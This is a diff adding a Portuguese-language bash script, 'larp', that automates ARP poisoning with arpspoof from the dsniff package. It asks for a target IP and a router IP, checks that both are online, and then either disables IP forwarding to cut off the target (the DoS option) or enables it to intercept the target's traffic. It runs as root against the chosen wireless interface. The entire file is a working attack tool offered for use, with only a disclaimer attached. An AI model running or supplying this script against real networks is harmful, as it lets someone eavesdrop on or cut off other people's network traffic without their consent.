@@ -1,0 +1,200 @@
+#!/bin/bash
+
+# Este simples script facilita um pouco a aplicação da técnica de envenenamento ARP
+# Utiliza o programa arpspoof disponível no pacote dsniff
+
+# Eu não me responsabilizo pela má utilização desta ferramenta
+# Não utilize-a em organizações militares ou privadas
+# Autor: Lucas Vieira de Jesus <lucas.engen.cc@gmail.com>
+# Data: 25/06/2018
+
+# Variáveis globais
+caminho='/proc/sys/net/ipv4/ip_forward'
+ip_alvo=""
+ip_roteador=""
+resposta=""
+interface=""
+lista_interfaces=""
+RED='\x1b[1;31m'
+GREEN='\x1b[1;32m'
+YELLOW='\x1b[1;33m'
+BLUE='\x1b[1;34m'
+MAGENTA='\x1b[1;35m'
+CYAN='\x1b[1;36m'
+RESET='\x1b[0m'
+COLS="$(tput cols)"
+LINES="$(tput lines)"
+AUTHOR="Lucas Vieira"
+V_MAJOR="1"
+V_MINOR="0"
+V_PATCH="0"
+TAMANHO_LINHA=62
+
+# Subrotinas
+function log_alerta()
+{
+	echo -e "${YELLOW}[!]${RESET} $1"
+}
+
+function log_err()
+{
+	echo -e "${RED}[!]${RESET} $1"
+}
+
+function log_info()
+{
+	echo -e "${BLUE}[*]${RESET} $1"
+}
+
+function log_ok()
+{
+	echo -e "${GREEN}[+]${RESET} $1"
+}
+
+function log_pergunta()
+{
+	echo -e "${YELLOW}[?]${RESET} $1"
+}
+
+function log_show()
+{
+	echo -e "${RED}[*]${RESET} $1"
+}
+
+function verifica_ip_forward()
+{
+	flag="$(cat $caminho)"
+	log_pergunta "Deseja fazer um DoS (s/n) ?"
+	read -s -n 1 resposta
+	if [ "$resposta" == "s" ] || [ "$resposta" == "S" ]; then
+		log_info "Desabilitando o repasse de pacotes ..."
+		if [ $flag == "1" ]; then
+			echo 0 > $caminho
+		fi
+	else
+		log_info "Ativando o repasse de pacotes ..."
+		echo 1 > $caminho
+	fi
+}
+
+function checa_host
+{
+	ping -c 4 $1 > /dev/null
+	if [ "$?" == "2" ]; then
+		log_err "Ip incorreto\n"
+		exit $?
+	fi
+	
+	if [ "$?" != "0" ]; then
+		log_err "Erro ao conectar-se ao host.\n"
+		exit $?
+	fi
+	
+	log_ok "Host online: $1"
+}
+
+function get_alvos()
+{
+	read -p 'Ip do alvo: ' ip_alvo
+	read -p 'Ip do roteador: ' ip_roteador
+	
+	log_info "Verificando alvo ..."
+	checa_host $ip_alvo
+	log_info "Verificando roteador ..."
+	checa_host $ip_roteador
+	
+	log_info "Devo interceptar o trafego entre: $ip_alvo e $ip_roteador."
+	log_pergunta "Correto ? (s/n)"
+	read -s -n 1 resposta
+	if [ "$resposta" == "S" ] || [ "$resposta" == "s" ]; then
+		return 0
+	else
+		return 1
+	fi
+}
+
+function get_interface()
+{
+	lista_interfaces="$(ifconfig | grep -e wlan[0-9] --colour=always -o)"
+	if [ "$lista_interfaces" == "1" ]; then
+		log_err "Nenhuma interface wireless encontrada"
+		return 1
+	else
+		log_ok "Interfaces wireless encontradas:\n"
+		echo -e "$lista_interfaces\n"
+		read -p "Diga-me qual devo usar: " interface
+		return 0
+	fi
+}
+
+function mostra_dependencias()
+{
+	log_show "dnsniff ==> arpspoof"
+	desenha_linha_horizontal $TAMANHO_LINHA
+	echo -e "\n"
+}
+
+function resetar_configs_pacotes_ipv4()
+{
+	log_info "Desabilitando o repasse de pacotes ..."
+	echo 0 > $caminho
+}
+
+function desenha_linha_horizontal()
+{
+	for i in `seq 1 $1`;
+	do
+		echo -n "_"
+	done
+}
+
+function mostra_banner()
+{
+	caminho_shell_32_dll="C:\\Windows\\system32\\shell32.dll"
+	desenha_linha_horizontal $TAMANHO_LINHA
+	echo ""
+	log_show "larp v$V_MAJOR.$V_MINOR.$V_PATCH - ferramenta para realizar envenenamento ARP"
+	log_show "Autor: $AUTHOR"
+	log_show "Data: 25/06/2018"
+	log_show "Dependencias:"
+	mostra_dependencias
+	if [ -f $caminho_shell_32_dll ]; then
+	log_err "Estou no windows, mas fui escrito para o Linux :("
+	exit 1
+	fi
+}
+
+function main()
+{
+	mostra_banner
+	log_info "Iniciando o larp ..."
+	if [ "$UID" != "0" ]; then
+		log_err "Eu preciso ser root"
+		exit 1
+	fi
+
+	until get_alvos;
+	do clear
+	done
+
+	get_interface
+	echo $interface | grep -e wlan[0-9] -o > /dev/null
+	if [ "$?" != "0" ]; then
+	log_err "Interface incorreta selecionada"
+	else
+	log_info "Atacando pela interface $interface ..."
+	fi
+
+	verifica_ip_forward
+	log_ok "Aplicando o envenenamento ARP ao alvo '$ip_alvo' ..."
+	arpspoof -i $interface -t $ip_alvo -r $ip_roteador
+	resetar_configs_pacotes_ipv4
+	if [ "$?" != "0" ]; then
+	log_err "O ataque falhou. Erro $?"
+	else
+	log_ok "O ataque foi terminado com sucesso\n"
+	fi
+}
+
+# Início
+main
